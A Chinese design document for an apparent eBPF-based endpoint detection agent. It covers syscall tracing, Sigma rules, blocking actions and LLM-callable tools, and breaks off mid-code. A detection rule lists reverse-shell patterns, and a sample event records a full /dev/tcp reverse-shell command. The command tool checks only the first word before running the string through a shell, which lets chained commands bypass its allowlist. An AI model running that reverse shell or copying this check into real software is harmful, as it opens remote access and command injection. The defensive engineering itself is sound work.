# Agent详细设计文档 - V5.0

**版本**: 5.0
**状态**: 已实现
**日期**: 2026-03-19
**最后更新**: 2026-03-24

---

## 1. 概述

Agent是部署在目标主机上的轻量级Go程序，作为AI智能运行时检测系统的执行端点。V5.0版本新增了基于eBPF的运行时事件采集、Sigma规则匹配、阻断执行和工具暴露功能。

### 1.1 设计约束

| 约束 | 要求 |
|:---|:---|
| CPU | 1核，使用率 < 20% |
| 内存 | 1GB，使用量 < 512MB |
| 内核版本 | 4.17+ |
| 技术栈 | Go + cilium/ebpf（纯Go，无CGO） |

### 1.2 实现状态

| 功能 | 状态 | 说明 |
|:---|:---|:---|
| eBPF事件采集 | ✅ 已实现 | 8个程序全部加载成功 |
| Sigma规则匹配 | ✅ 已实现 | 支持regex和contains匹配 |
| 事件上报 | ✅ 已实现 | 通过gRPC ReportEvent |
| 规则同步 | ✅ 已实现 | 首次全量 + 增量更新 |
| 本地规则缓存 | ✅ 已实现 | /etc/aegis-agent/rules/ |
| 进程阻断 | ✅ 已实现 | kill_process |
| 文件隔离 | ✅ 已实现 | quarantine_file |

### 1.3 已知问题与解决方案

| 问题 | 原因 | 解决方案 |
|:---|:---|:---|
| eBPF读取用户空间内存失败 | 容器环境权限限制 | 从/proc/[pid]/cmdline补充 |
| BPF对象文件路径问题 | 相对路径在不同运行目录失效 | 多路径查找：可执行文件目录、相对路径 |

---

## 2. 核心功能

### 2.1 功能模块

| 模块 | 功能 | 版本 |
|:---|:---|:---|
| 心跳与注册 | 与Backend保持连接 | V2.2 |
| 资产信息收集 | 采集主机信息 | V2.2 |
| 命令执行 | 执行Backend下发的脚本 | V2.2 |
| 软件清单采集 | 采集已安装软件 | V3.0 |
| **eBPF事件采集** | 基于eBPF采集运行时事件 | **V5.0** |
| **Sigma规则匹配** | 匹配Sigma规则，初筛ATT&CK事件 | **V5.0** |
| **阻断执行** | 执行阻断操作（杀进程、隔离文件等） | **V5.0** |
| **工具暴露** | 暴露工具给LLM调用 | **V5.0** |

---

## 3. 目录结构

```
/agent
|-- /cmd/agent                     # 主程序入口
|   |-- main.go
|-- /internal
|   |-- /ebpf                      # eBPF事件采集模块
|   |   |-- loader.go              # eBPF程序加载器
|   |   |-- event_handler.go       # 事件处理
|   |-- /ebpf/progs                # eBPF程序源码
|   |   |-- execve.bpf.c           # 进程执行追踪
|   |   |-- fork.bpf.c             # 进程创建追踪
|   |   |-- exit.bpf.c             # 进程退出追踪
|   |   |-- openat.bpf.c           # 文件访问追踪
|   |   |-- connect.bpf.c          # 网络连接追踪
|   |   |-- setuid.bpf.c           # 权限变更追踪
|   |   |-- setgid.bpf.c           # 组权限变更追踪
|   |   |-- capset.bpf.c           # 能力集变更追踪
|   |-- /sigma                     # Sigma规则模块
|   |   |-- parser.go              # 规则解析器
|   |   |-- matcher.go             # 规则匹配器
|   |   |-- index.go               # 规则索引
|   |   |-- loader.go              # 规则加载器
|   |-- /blocker                   # 阻断模块
|   |   |-- blocker.go             # 阻断执行器
|   |   |-- process.go             # 进程阻断
|   |   |-- file.go                # 文件隔离
|   |   |-- network.go             # 网络阻断
|   |   |-- user.go                # 用户禁用
|   |-- /tools                     # 工具暴露模块
|   |   |-- tool_manager.go        # 工具管理器
|   |   |-- process.go             # 进程工具
|   |   |-- network.go             # 网络工具
|   |   |-- file.go                # 文件工具
|   |   |-- user.go                # 用户工具
|   |   |-- command.go             # 命令执行工具
|   |-- /client                    # gRPC客户端
|   |   |-- client.go              # gRPC通信
|   |   |-- heartbeat.go           # 心跳模块
|   |   |-- event_reporter.go      # 事件上报
|   |   |-- tool_handler.go        # 工具调用处理
|   |   |-- rule_receiver.go       # 规则接收
|   |-- /monitor                   # Agent监控模块
|   |   |-- metrics.go             # 指标收集
|   |   |-- audit.go               # 审计日志
|   |-- /asset                     # 资产信息收集（已有）
|   |-- /executor                  # 命令执行（已有）
|   |-- /software                  # 软件清单（已有）
|   |-- /config                    # 配置模块
|       |-- config.go
|-- /rules                         # 本地规则缓存
|-- /quarantine                    # 文件隔离目录
|-- /var/lib/aegis-agent/          # 数据目录
|   |-- quarantine_log.json        # 隔离记录
|   |-- audit_log.json             # 审计日志
|-- go.mod
|-- Makefile
```

---

## 4. eBPF事件采集模块

### 4.1 技术选型

| 组件 | 选择 | 说明 |
|:---|:---|:---|
| eBPF库 | cilium/ebpf | 纯Go，无CGO |
| 最低内核版本 | 4.17 | 支持kprobe/tracepoint |
| 事件传输 | Ring Buffer | 高性能 |
| 程序类型 | Tracepoint优先 | 稳定性好 |

### 4.2 采集事件类型

| 事件 | Tracepoint/Kprobe | 说明 |
|:---|:---|:---|
| 进程执行 | `sched_process_exec` | 新进程执行 |
| 进程创建 | `sched_process_fork` | 进程fork |
| 进程退出 | `sched_process_exit` | 进程退出 |
| 文件访问 | `sys_enter_openat` | 文件打开 |
| 网络连接 | `sys_enter_connect` | 网络连接建立 |
| 权限变更 | `sys_enter_setuid` | 用户权限变更 |
| 组权限变更 | `sys_enter_setgid` | 组权限变更 |
| 能力集变更 | `sys_enter_capset` | 能力集变更 |

### 4.3 eBPF程序示例

#### 4.3.1 进程执行追踪

```c
// execve.bpf.c
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define TASK_COMM_LEN 16
#define MAX_PATH_LEN 256

struct exec_event {
    u32 pid;
    u32 ppid;
    u32 uid;
    u32 gid;
    u8 comm[TASK_COMM_LEN];
    u8 filename[MAX_PATH_LEN];
    u8 args[MAX_PATH_LEN];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} exec_events SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve(struct trace_event_raw_sys_enter *ctx)
{
    struct exec_event *e;
    struct task_struct *task;
    
    e = bpf_ringbuf_reserve(&exec_events, sizeof(*e), 0);
    if (!e)
        return 0;
    
    // 采集所有事件，不做内核侧过滤
    e->pid = bpf_get_current_pid_tgid() >> 32;
    e->uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    e->gid = bpf_get_current_uid_gid() >> 32;
    
    task = (struct task_struct *)bpf_get_current_task();
    e->ppid = BPF_CORE_READ(task, real_parent, tgid);
    
    bpf_get_current_comm(e->comm, sizeof(e->comm));
    bpf_probe_read_user_str(e->filename, sizeof(e->filename), 
                            (const char *)ctx->args[0]);
    
    bpf_ringbuf_submit(e, 0);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

#### 4.3.2 文件访问追踪

```c
// openat.bpf.c
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

struct file_event {
    u32 pid;
    u32 uid;
    u8 comm[16];
    u8 filename[256];
    s32 flags;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} file_events SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_openat")
int trace_openat(struct trace_event_raw_sys_enter *ctx)
{
    struct file_event *e;
    
    e = bpf_ringbuf_reserve(&file_events, sizeof(*e), 0);
    if (!e)
        return 0;
    
    e->pid = bpf_get_current_pid_tgid() >> 32;
    e->uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    bpf_get_current_comm(e->comm, sizeof(e->comm));
    bpf_probe_read_user_str(e->filename, sizeof(e->filename),
                            (const char *)ctx->args[1]);
    e->flags = (s32)ctx->args[2];
    
    bpf_ringbuf_submit(e, 0);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

#### 4.3.3 网络连接追踪

```c
// connect.bpf.c
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_endian.h>

struct conn_event {
    u32 pid;
    u32 uid;
    u8 comm[16];
    u8 saddr[4];
    u8 daddr[4];
    u16 sport;
    u16 dport;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} conn_events SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_connect")
int trace_connect(struct trace_event_raw_sys_enter *ctx)
{
    struct conn_event *e;
    struct sockaddr *addr = (struct sockaddr *)ctx->args[1];
    
    e = bpf_ringbuf_reserve(&conn_events, sizeof(*e), 0);
    if (!e)
        return 0;
    
    e->pid = bpf_get_current_pid_tgid() >> 32;
    e->uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    bpf_get_current_comm(e->comm, sizeof(e->comm));
    
    // 读取目标地址
    struct sockaddr_in *sin = (struct sockaddr_in *)addr;
    bpf_probe_read(&e->daddr, sizeof(e->daddr), &sin->sin_addr);
    bpf_probe_read(&e->dport, sizeof(e->dport), &sin->sin_port);
    e->dport = bpf_ntohs(e->dport);
    
    bpf_ringbuf_submit(e, 0);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

### 4.4 eBPF程序加载

```go
// loader.go
package ebpf

import (
    "github.com/cilium/ebpf"
    "github.com/cilium/ebpf/link"
    "github.com/cilium/ebpf/ringbuf"
)

type EBPFLoader struct {
    collections map[string]*ebpf.Collection
    links       []link.Link
    readers     map[string]*ringbuf.Reader
}

func NewEBPFLoader() *EBPFLoader {
    return &EBPFLoader{
        collections: make(map[string]*ebpf.Collection),
        readers:     make(map[string]*ringbuf.Reader),
    }
}

func (l *EBPFLoader) LoadProgram(name string, spec *ebpf.CollectionSpec) error {
    // 加载eBPF程序
    coll, err := ebpf.NewCollection(spec)
    if err != nil {
        return err
    }
    l.collections[name] = coll
    
    // 附加到tracepoint
    tp, err := link.Tracepoint("syscalls", "sys_enter_"+name, coll.Programs["trace_"+name], nil)
    if err != nil {
        return err
    }
    l.links = append(l.links, tp)
    
    // 创建ring buffer reader
    rd, err := ringbuf.NewReader(coll.Maps[name+"_events"])
    if err != nil {
        return err
    }
    l.readers[name] = rd
    
    return nil
}

func (l *EBPFLoader) Close() {
    for _, rd := range l.readers {
        rd.Close()
    }
    for _, l := range l.links {
        l.Close()
    }
    for _, coll := range l.collections {
        coll.Close()
    }
}
```

---

## 5. Sigma规则模块

### 5.1 规则格式

```yaml
title: Reverse Shell Detection
id: reverse_shell_t1059_004
status: experimental
description: Detects reverse shell execution
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains:
            - '/bin/bash -i'
            - '/bin/sh -i'
            - 'nc -e'
            - 'python.*socket'
    condition: selection
level: critical
tags:
    - attack.t1059.004
```

### 5.2 规则来源

规则由Backend统一管理，通过gRPC下发到Agent：
- 首次连接：全量下发所有active和experimental规则
- 动态更新：增量下发变更（新增/更新/删除）

Agent本地缓存规则到文件系统 `/etc/aegis-agent/rules/`

### 5.3 规则生效流程

```
LLM生成规则
    ↓
存入数据库（status: pending）
    ↓
等待人工审核
    ├─ 24小时内审核 → 立即下发（status: active）
    └─ 24小时后无人审核 → 自动下发（status: experimental）
```

### 5.4 规则同步机制

**首次连接**：全量下发所有active和experimental规则

**动态更新**：增量下发变更
- 新增：附加到规则列表
- 更新：替换旧规则
- 删除：从规则列表移除

**规则加载**：
```go
// loader.go
package sigma

import (
    "gopkg.in/yaml.v3"
)

type RuleLoader struct {
    rules map[string]*Rule
}

func (l *RuleLoader) LoadAll(rules []*Rule) {
    for _, rule := range rules {
        l.rules[rule.ID] = rule
    }
    l.rebuildIndex()
}

func (l *RuleLoader) ApplyUpdate(update *RuleUpdate) {
    switch update.Action {
    case "add":
        l.rules[update.RuleID] = update.Rule
    case "update":
        l.rules[update.RuleID] = update.Rule
    case "delete":
        delete(l.rules, update.RuleID)
    }
    l.rebuildIndex()
}
```

### 5.5 规则解析器

```go
// parser.go
package sigma

import (
    "gopkg.in/yaml.v3"
)

type Rule struct {
    Title       string    `yaml:"title"`
    ID          string    `yaml:"id"`
    Status      string    `yaml:"status"`
    Description string    `yaml:"description"`
    Logsource   Logsource `yaml:"logsource"`
    Detection   Detection `yaml:"detection"`
    Level       string    `yaml:"level"`
    Tags        []string  `yaml:"tags"`
}

type Logsource struct {
    Category string `yaml:"category"`
    Product  string `yaml:"product"`
}

type Detection struct {
    Selections  map[string]interface{} `yaml:",inline"`
    Condition   string                 `yaml:"condition"`
}

func ParseRule(content []byte) (*Rule, error) {
    var rule Rule
    if err := yaml.Unmarshal(content, &rule); err != nil {
        return nil, err
    }
    return &rule, nil
}
```

### 5.6 规则索引（性能优化）

```go
// index.go
package sigma

type RuleIndex struct {
    byCategory map[string][]*CompiledRule  // category -> rules
}

func NewRuleIndex() *RuleIndex {
    return &RuleIndex{
        byCategory: make(map[string][]*CompiledRule),
    }
}

func (idx *RuleIndex) Rebuild(rules map[string]*Rule) {
    idx.byCategory = make(map[string][]*CompiledRule)
    
    for _, rule := range rules {
        compiled := CompileRule(rule)
        category := rule.Logsource.Category
        idx.byCategory[category] = append(idx.byCategory[category], compiled)
    }
}

func (idx *RuleIndex) Match(event *Event) []*CompiledRule {
    // 只匹配对应类别的规则
    category := event.Category
    rules := idx.byCategory[category]
    
    var matched []*CompiledRule
    for _, rule := range rules {
        if rule.Match(event) {
            matched = append(matched, rule)
        }
    }
    return matched
}
```

### 5.7 规则匹配器

```go
// matcher.go
package sigma

type CompiledRule struct {
    ID        string
    Title     string
    MitreID   string
    Severity  string
    Logsource Logsource
    Matcher   EventMatcher
}

type EventMatcher interface {
    Match(event map[string]interface{}) bool
}

func CompileRule(rule *Rule) *CompiledRule {
    return &CompiledRule{
        ID:        rule.ID,
        Title:     rule.Title,
        MitreID:   extractMitreID(rule.Tags),
        Severity:  rule.Level,
        Logsource: rule.Logsource,
        Matcher:   compileDetection(rule.Detection),
    }
}

func (r *CompiledRule) Match(event map[string]interface{}) bool {
    return r.Matcher.Match(event)
}
```

---

## 6. 事件上报模块

### 6.1 事件类型

| 类型 | EventType | 采集来源 |
|:---|:---|:---|
| 进程执行 | `process_exec` | sched_process_exec |
| 进程创建 | `process_fork` | sched_process_fork |
| 进程退出 | `process_exit` | sched_process_exit |
| 文件访问 | `file_access` | sys_enter_openat |
| 网络连接 | `network_connect` | sys_enter_connect |
| 权限变更 | `privilege_change` | sys_enter_setuid/setgid/capset |

### 6.2 事件数据结构

```go
// 通用事件基础结构
type BaseEvent struct {
    EventID   string `json:"event_id"`
    HostID    string `json:"host_id"`
    Hostname  string `json:"hostname"`
    Timestamp int64  `json:"timestamp"`
    EventType string `json:"event_type"`
    
    // 命中的规则信息
    MatchedRuleID string `json:"matched_rule_id"`
    MitreID       string `json:"mitre_id"`
    Severity      string `json:"severity"`
    RuleTitle     string `json:"rule_title"`
}

// 进程执行事件
type ProcessExecEvent struct {
    BaseEvent
    PID         int    `json:"pid"`
    PPID        int    `json:"ppid"`
    UID         int    `json:"uid"`
    GID         int    `json:"gid"`
    Comm        string `json:"comm"`
    Filename    string `json:"filename"`
    Args        string `json:"args"`
    CommandLine string `json:"command_line"`
}

// 进程创建事件
type ProcessForkEvent struct {
    BaseEvent
    ParentPID  int    `json:"parent_pid"`
    ChildPID   int    `json:"child_pid"`
    ParentComm string `json:"parent_comm"`
    ChildComm  string `json:"child_comm"`
}

// 进程退出事件
type ProcessExitEvent struct {
    BaseEvent
    PID      int    `json:"pid"`
    ExitCode int    `json:"exit_code"`
    Comm     string `json:"comm"`
}

// 文件访问事件
type FileAccessEvent struct {
    BaseEvent
    PID      int    `json:"pid"`
    UID      int    `json:"uid"`
    Comm     string `json:"comm"`
    Filename string `json:"filename"`
    Flags    int    `json:"flags"`
}

// 网络连接事件
type NetworkConnectEvent struct {
    BaseEvent
    PID        int    `json:"pid"`
    UID        int    `json:"uid"`
    Comm       string `json:"comm"`
    Saddr      string `json:"saddr"`
    Sport      int    `json:"sport"`
    Daddr      string `json:"daddr"`
    Dport      int    `json:"dport"`
}

// 权限变更事件
type PrivilegeChangeEvent struct {
    BaseEvent
    PID          int    `json:"pid"`
    UID          int    `json:"uid"`
    Comm         string `json:"comm"`
    Syscall      string `json:"syscall"`
    TargetUID    int    `json:"target_uid"`
    TargetGID    int    `json:"target_gid"`
    CapEffective uint64 `json:"cap_effective"`
    CapPermitted uint64 `json:"cap_permitted"`
}
```

### 6.3 上报格式示例

```json
{
  "event_id": "evt-20260319-001",
  "host_id": "host-001",
  "hostname": "web-server-01",
  "timestamp": 1710825000000,
  "event_type": "process_exec",
  "pid": 12345,
  "ppid": 1000,
  "uid": 33,
  "gid": 33,
  "comm": "bash",
  "filename": "/bin/bash",
  "command_line": "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
  
  "matched_rule_id": "reverse_shell_t1059_004",
  "mitre_id": "T1059.004",
  "severity": "critical",
  "rule_title": "Reverse Shell Detection"
}
```

### 6.4 上报流程

```
eBPF采集所有事件（无过滤）
    ↓
用户空间接收事件
    ↓
Sigma规则匹配（~100条规则，按logsource索引）
    ↓
命中规则？
    ├─ 是 → 填充规则信息 → 上报Backend
    └─ 否 → 丢弃
```

### 6.5 上报代码

```go
// event_handler.go
package ebpf

type EventHandler struct {
    ruleManager *sigma.RuleManager
    reporter    *EventReporter
}

func (h *EventHandler) HandleEvent(event *Event) {
    // Sigma规则匹配
    matches := h.ruleManager.Match(event)
    
    if len(matches) == 0 {
        // 未命中任何规则，丢弃
        return
    }
    
    // 命中规则，填充规则信息并上报
    for _, match := range matches {
        event.MatchedRuleID = match.ID
        event.MitreID = match.MitreID
        event.Severity = match.Severity
        event.RuleTitle = match.Title
        
        h.reporter.Report(event)
    }
}
```

---

## 7. 阻断模块

### 7.1 阻断动作

| 动作 | 参数 | 说明 | 可回滚 |
|:---|:---|:---|:---|
| `kill_process` | pid | 杀死进程 | ❌ |
| `quarantine_file` | file_path | 隔离文件 | ✅ |
| `block_connection` | remote_addr | 阻断网络连接 | ❌ |
| `disable_user` | username | 禁用用户 | ❌ |
| `revoke_permission` | file_path | 撤销文件权限 | ❌ |

### 7.2 阻断实现

```go
// blocker.go
package blocker

type Blocker struct {
    quarantineDir  string
    protectedProcs []string
    auditLog       *AuditLog
}

func NewBlocker(quarantineDir string) *Blocker {
    return &Blocker{
        quarantineDir: quarantineDir,
        protectedProcs: []string{
            "systemd", "sshd", "init", "kthreadd",
            "dockerd", "containerd", "kubelet",
            "postgres", "redis-server", "nginx",
        },
    }
}

func (b *Blocker) Execute(action string, params map[string]interface{}) error {
    switch action {
    case "kill_process":
        pid := int(params["pid"].(float64))
        return b.KillProcess(pid)
    case "quarantine_file":
        filePath := params["file_path"].(string)
        return b.QuarantineFile(filePath)
    case "block_connection":
        remoteAddr := params["remote_addr"].(string)
        return b.BlockConnection(remoteAddr)
    case "disable_user":
        username := params["username"].(string)
        return b.DisableUser(username)
    case "revoke_permission":
        filePath := params["file_path"].(string)
        return b.RevokePermission(filePath)
    default:
        return fmt.Errorf("unknown action: %s", action)
    }
}
```

### 7.3 进程阻断

```go
// process.go
package blocker

func (b *Blocker) KillProcess(pid int) error {
    // 获取进程信息
    proc, err := getProcessInfo(pid)
    if err != nil {
        return err
    }
    
    // 检查是否是受保护进程
    if b.isProtected(proc.Name) {
        return fmt.Errorf("protected process: %s", proc.Name)
    }
    
    // 记录审计日志
    b.auditLog.Record("kill_process", fmt.Sprintf("%d", pid), proc.Name, "success")
    
    // 杀死进程
    process, _ := os.FindProcess(pid)
    return process.Kill()
}

func (b *Blocker) isProtected(procName string) bool {
    for _, p := range b.protectedProcs {
        if p == procName {
            return true
        }
    }
    return false
}
```

### 7.4 文件隔离

```go
// file.go
package blocker

type QuarantineRecord struct {
    OriginalPath   string `json:"original_path"`
    QuarantinePath string `json:"quarantine_path"`
    Timestamp      int64  `json:"timestamp"`
    Reason         string `json:"reason"`
}

func (b *Blocker) QuarantineFile(filePath string) error {
    // 生成隔离路径
    quarantinePath := filepath.Join(b.quarantineDir,
        fmt.Sprintf("%s.%d", filepath.Base(filePath), time.Now().Unix()))
    
    // 移动文件到隔离目录
    if err := os.Rename(filePath, quarantinePath); err != nil {
        return err
    }
    
    // 记录隔离记录
    record := &QuarantineRecord{
        OriginalPath:   filePath,
        QuarantinePath: quarantinePath,
        Timestamp:      time.Now().Unix(),
    }
    b.saveQuarantineRecord(record)
    
    // 记录审计日志
    b.auditLog.Record("quarantine_file", filePath, quarantinePath, "success")
    
    return nil
}

func (b *Blocker) RollbackQuarantine(quarantinePath string) error {
    // 查找隔离记录
    record, err := b.findQuarantineRecord(quarantinePath)
    if err != nil {
        return err
    }
    
    // 恢复文件
    if err := os.Rename(quarantinePath, record.OriginalPath); err != nil {
        return err
    }
    
    // 记录审计日志
    b.auditLog.Record("rollback_quarantine", quarantinePath, record.OriginalPath, "success")
    
    return nil
}
```

### 7.5 网络阻断

```go
// network.go
package blocker

func (b *Blocker) BlockConnection(remoteAddr string) error {
    // 使用iptables阻断
    cmd := exec.Command("iptables", "-A", "OUTPUT", "-d", remoteAddr, "-j", "DROP")
    if err := cmd.Run(); err != nil {
        return err
    }
    
    // 记录审计日志
    b.auditLog.Record("block_connection", remoteAddr, "", "success")
    
    return nil
}
```

### 7.6 用户禁用

```go
// user.go
package blocker

func (b *Blocker) DisableUser(username string) error {
    // 锁定用户账户
    cmd := exec.Command("usermod", "-L", username)
    if err := cmd.Run(); err != nil {
        return err
    }
    
    // 记录审计日志
    b.auditLog.Record("disable_user", username, "", "success")
    
    return nil
}
```

### 7.7 权限撤销

```go
func (b *Blocker) RevokePermission(filePath string) error {
    // 移除所有权限
    cmd := exec.Command("chmod", "000", filePath)
    if err := cmd.Run(); err != nil {
        return err
    }
    
    // 记录审计日志
    b.auditLog.Record("revoke_permission", filePath, "", "success")
    
    return nil
}
```

---

## 8. 工具暴露模块

### 8.1 工具列表

| 工具 | 参数 | 返回值 | 说明 |
|:---|:---|:---|:---|
| `get_process_tree` | pid | ProcessTree | 获取进程树 |
| `get_network_connections` | pid | NetworkConnections | 获取网络连接 |
| `get_file_info` | file_path | FileInfo | 获取文件信息 |
| `get_user_info` | username | UserInfo | 获取用户信息 |
| `execute_command` | command | CommandResult | 执行命令 |

### 8.2 工具定义（给LLM）

```json
{
  "tools": [
    {
      "name": "get_process_tree",
      "description": "获取指定进程的进程树，包括父进程、子进程信息",
      "parameters": {
        "type": "object",
        "properties": {
          "pid": {
            "type": "integer",
            "description": "进程ID"
          }
        },
        "required": ["pid"]
      }
    },
    {
      "name": "get_network_connections",
      "description": "获取指定进程的网络连接信息",
      "parameters": {
        "type": "object",
        "properties": {
          "pid": {
            "type": "integer",
            "description": "进程ID"
          }
        },
        "required": ["pid"]
      }
    },
    {
      "name": "get_file_info",
      "description": "获取文件的详细信息，包括权限、所有者、大小等",
      "parameters": {
        "type": "object",
        "properties": {
          "file_path": {
            "type": "string",
            "description": "文件路径"
          }
        },
        "required": ["file_path"]
      }
    },
    {
      "name": "get_user_info",
      "description": "获取用户的详细信息，包括UID、GID、组、shell等",
      "parameters": {
        "type": "object",
        "properties": {
          "username": {
            "type": "string",
            "description": "用户名"
          }
        },
        "required": ["username"]
      }
    },
    {
      "name": "execute_command",
      "description": "执行系统命令，返回执行结果",
      "parameters": {
        "type": "object",
        "properties": {
          "command": {
            "type": "string",
            "description": "要执行的命令"
          }
        },
        "required": ["command"]
      }
    }
  ]
}
```

### 8.3 工具返回值结构

```go
// 进程树
type ProcessTree struct {
    PID         int           `json:"pid"`
    PPID        int           `json:"ppid"`
    Name        string        `json:"name"`
    CommandLine string        `json:"command_line"`
    User        string        `json:"user"`
    Children    []ProcessInfo `json:"children"`
}

type ProcessInfo struct {
    PID  int    `json:"pid"`
    Name string `json:"name"`
}

// 网络连接
type NetworkConnections struct {
    PID         int          `json:"pid"`
    Connections []Connection `json:"connections"`
}

type Connection struct {
    LocalAddr  string `json:"local_addr"`
    LocalPort  int    `json:"local_port"`
    RemoteAddr string `json:"remote_addr"`
    RemotePort int    `json:"remote_port"`
    State      string `json:"state"`
}

// 文件信息
type FileInfo struct {
    Path        string `json:"path"`
    Size        int64  `json:"size"`
    Permissions string `json:"permissions"`
    Owner       string `json:"owner"`
    Group       string `json:"group"`
    ModifiedAt  string `json:"modified_at"`
    MD5         string `json:"md5"`
    IsSUID      bool   `json:"is_suid"`
    IsSGID      bool   `json:"is_sgid"`
}

// 用户信息
type UserInfo struct {
    Username string   `json:"username"`
    UID      int      `json:"uid"`
    GID      int      `json:"gid"`
    Groups   []string `json:"groups"`
    Shell    string   `json:"shell"`
    HomeDir  string   `json:"home_dir"`
    IsLocked bool     `json:"is_locked"`
}

// 命令执行结果
type CommandResult struct {
    Command  string `json:"command"`
    ExitCode int    `json:"exit_code"`
    Stdout   string `json:"stdout"`
    Stderr   string `json:"stderr"`
    Duration int    `json:"duration_ms"`
}
```

### 8.4 工具调用实现

```go
// tool_manager.go
package tools

type ToolManager struct {
    allowedCommands []string
}

func NewToolManager() *ToolManager {
    return &ToolManager{
        allowedCommands: []string{
            "ps", "ls", "cat", "netstat", "ss", "lsof",
            "whoami", "id", "groups", "find", "stat",
            "file", "strings", "md5sum", "sha256sum",
        },
    }
}

func (m *ToolManager) Execute(tool string, params map[string]interface{}) (interface{}, error) {
    switch tool {
    case "get_process_tree":
        pid := int(params["pid"].(float64))
        return m.GetProcessTree(pid)
    case "get_network_connections":
        pid := int(params["pid"].(float64))
        return m.GetNetworkConnections(pid)
    case "get_file_info":
        filePath := params["file_path"].(string)
        return m.GetFileInfo(filePath)
    case "get_user_info":
        username := params["username"].(string)
        return m.GetUserInfo(username)
    case "execute_command":
        command := params["command"].(string)
        return m.ExecuteCommand(command)
    default:
        return nil, fmt.Errorf("unknown tool: %s", tool)
    }
}
```

### 8.5 命令执行（安全限制）

```go
// command.go
package tools

func (m *ToolManager) ExecuteCommand(command string) (*CommandResult, error) {
    // 检查命令白名单
    cmdName := strings.Split(command, " ")[0]
    if !m.isAllowed(cmdName) {
        return nil, fmt.Errorf("command not allowed: %s", cmdName)
    }
    
    // 设置超时（10秒）
    ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
    defer cancel()
    
    // 执行命令
    start := time.Now()
    cmd := exec.CommandContext(ctx, "sh", "-c", command)
    stdout, stderr := cmd.Output()
    duration := time.Since(start).Milliseconds()
    
    return &CommandResult{
        Command:  command,
        ExitCode: cmd.ProcessState.ExitCode(),
        Stdout:   string(stdout),
        Stderr:   string(stderr),
        Duration: int(duration),
    }, nil
}

func (m *ToolManager) isAllowed(cmdName string) bool {
    for _, allowed := range m.allowedCommands {
        if allowed == cmdName {
            return true
        }
    }
    return false
}
```

### 8.6 工具调用协议

**请求**（Backend → Agent）：
```json
{
  "call_id": "call-20260319-001",
  "tool": "get_process_tree",
  "params": {
    "pid": 12345
  }
}
```

**响应**（Agent → Backend）：
```json
{
  "call_id": "call-20260319-001",
  "success": true,
  "result": {
    "pid": 12345,
    "ppid": 1000,
    "name": "bash",
    "command_line": "/bin/bash -i",
    "user": "www-data",
    "children": [
      {"pid": 12346, "name": "nc"}
    ]
  }
}
```

### 8.7 工具调用流程

```
LLM分析事件 → 需要更多信息 → 选择工具和参数
    ↓
Backend转发请求到Agent
    ↓
Agent执行工具 → 返回结果
    ↓
Backend转发结果给LLM
    ↓
LLM继续分析
    ↓
（最多重复10次）
```

---

## 9. gRPC通信模块

### 9.1 gRPC服务定义

```protobuf
syntax = "proto3";

service AgentService {
  // 已有RPC
  rpc Register(RegisterRequest) returns (RegisterResponse);
  rpc Heartbeat(HeartbeatRequest) returns (HeartbeatResponse);
  rpc ExecuteCommand(CommandRequest) returns (CommandResponse);
  rpc CollectSoftwareList(SoftwareListRequest) returns (SoftwareListResponse);
  
  // V5.0新增
  rpc ReportEvent(EventRequest) returns (EventResponse);
  rpc ExecuteTool(ToolRequest) returns (ToolResponse);
  rpc UpdateRules(RuleUpdateRequest) returns (RuleUpdateResponse);
  rpc ExecuteBlock(BlockRequest) returns (BlockResponse);
  rpc GetQuarantineList(QuarantineListRequest) returns (QuarantineListResponse);
  rpc RollbackQuarantine(RollbackRequest) returns (RollbackResponse);
}

// 事件上报
message EventRequest {
  string event_json = 1;  // JSON格式的事件数据
}

message EventResponse {
  bool success = 1;
}

// 工具调用
message ToolRequest {
  string call_id = 1;
  string tool = 2;
  string params_json = 3;  // JSON格式的参数
}

message ToolResponse {
  string call_id = 1;
  bool success = 2;
  string result_json = 3;  // JSON格式的结果
  string error = 4;
}

// 规则更新
message RuleUpdateRequest {
  string action = 1;  // add/update/delete/full_sync
  repeated Rule rules = 2;
}

message Rule {
  string rule_id = 1;
  string content = 2;  // YAML格式的规则内容
}

message RuleUpdateResponse {
  bool success = 1;
  int32 loaded_count = 2;
}

// 阻断执行
message BlockRequest {
  string action = 1;
  string params_json = 2;
}

message BlockResponse {
  bool success = 1;
  string error = 2;
}

// 隔离列表
message QuarantineListRequest {}

message QuarantineListResponse {
  repeated QuarantineRecord records = 1;
}

message QuarantineRecord {
  string original_path = 1;
  string quarantine_path = 2;
  int64 timestamp = 3;
  string reason = 4;
}

// 隔离回滚
message RollbackRequest {
  string quarantine_path = 1;
}

message RollbackResponse {
  bool success = 1;
  string error = 2;
}
```

### 9.2 事件上报

```go
// event_reporter.go
package client

type EventReporter struct {
    client AgentServiceClient
}

func (r *EventReporter) Report(event interface{}) error {
    eventJSON, _ := json.Marshal(event)
    
    _, err := r.client.ReportEvent(context.Background(), &EventRequest{
        EventJson: string(eventJSON),
    })
    
    return err
}
```

### 9.3 工具调用处理

```go
// tool_handler.go
package client

type ToolHandler struct {
    toolManager *tools.ToolManager
}

func (h *ToolHandler) Handle(req *ToolRequest) *ToolResponse {
    // 解析参数
    var params map[string]interface{}
    json.Unmarshal([]byte(req.ParamsJson), &params)
    
    // 执行工具
    result, err := h.toolManager.Execute(req.Tool, params)
    if err != nil {
        return &ToolResponse{
            CallId:  req.CallId,
            Success: false,
